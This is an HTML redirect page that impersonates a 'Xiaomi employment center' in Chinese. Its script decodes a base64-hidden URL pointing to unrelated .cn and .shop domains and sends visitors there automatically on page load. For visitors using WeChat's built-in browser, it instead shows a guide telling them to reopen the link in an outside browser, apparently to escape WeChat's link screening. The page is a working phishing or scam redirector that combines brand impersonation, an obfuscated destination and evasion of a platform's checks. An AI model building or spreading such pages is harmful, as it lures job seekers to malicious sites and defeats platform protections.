<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>跳转中...</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background-color: #fff;
      color: #000;
      overflow: hidden;
    }

    .guide-overlay {
      position: fixed;
      inset: 0;
      background-color: rgba(255, 255, 255, 0.95);
      z-index: 9999;
      display: none;
    }

    /* ✅ 顶部横幅栏 */
    .top-banner {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      background-color: #ff6900; /* 小米橙 */
      color: white;
      text-align: center;
      font-size: 16px;
      font-weight: bold;
      padding: 10px 0;
      z-index: 10000;
    }

    .guide-box {
      position: absolute;
      top: 60px; /* 向下留出横幅高度 */
      right: 10px;
      text-align: right;
    }

    .guide-box img.arrow {
      width: 100px;
      animation: bounce 1.5s infinite;
      margin-bottom: 5px;
    }

    .guide-box h2 {
      font-size: 18px;
      margin: 0;
      color: #111;
    }

    .guide-box p {
      font-size: 14px;
      color: #555;
      margin: 0;
    }

    .center-logo {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    .center-logo img {
      width: 80px;
      animation: spin 10s linear infinite, pulse 2s ease-in-out infinite alternate;
    }

    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-8px); }
    }

    @keyframes spin {
      from { transform: rotate(0deg); }
      to   { transform: rotate(360deg); }
    }

    @keyframes pulse {
      0% { opacity: 0.5; }
      100% { opacity: 1; }
    }
  </style>
</head>
<body>

<!-- 引导层 -->
<div class="guide-overlay" id="wechatGuide">
  <!-- ✅ 顶部横幅栏 -->
  <div class="top-banner">XIaomi就业中心</div>

  <div class="center-logo">
    <img src="xiaomi-logo.png" alt="小米 Logo">
  </div>

  <div class="guide-box">
    <img src="arrow.png" class="arrow" alt="向上箭头" />
    <h2>点击右上角 ···</h2>
    <p>选择“在浏览器中打开”</p>
  </div>
</div>

<script>
  const encodedUrl = "aHR0cDovL2Vhc3RsaW9uYWQuY24vSW5kdGx6eC5odG1sP2h0dHBzOi8vZ2dlcnNjLnNob3AvaUhkZ25YL3dpeXJ1aXdycHUvcnlldQ==";

  function decodeBase64(str) {
    try {
      return atob(str);
    } catch (e) {
      return null;
    }
  }

  function isWeChatBrowser() {
    const ua = navigator.userAgent.toLowerCase();
    return ua.includes("micromessenger");
  }

  window.onload = function () {
    const guide = document.getElementById("wechatGuide");
    const decodedUrl = decodeBase64(encodedUrl);

    if (!decodedUrl || !decodedUrl.startsWith("http")) {
      document.body.innerHTML = "<p style='padding:20px; color: #333;'>跳转地址无效，请联系管理员。</p>";
      return;
    }

    if (isWeChatBrowser()) {
      guide.style.display = "block";
    } else {
      setTimeout(() => {
        window.location.href = decodedUrl;
      }, 1000);
    }
  };
</script>

</body>
</html>
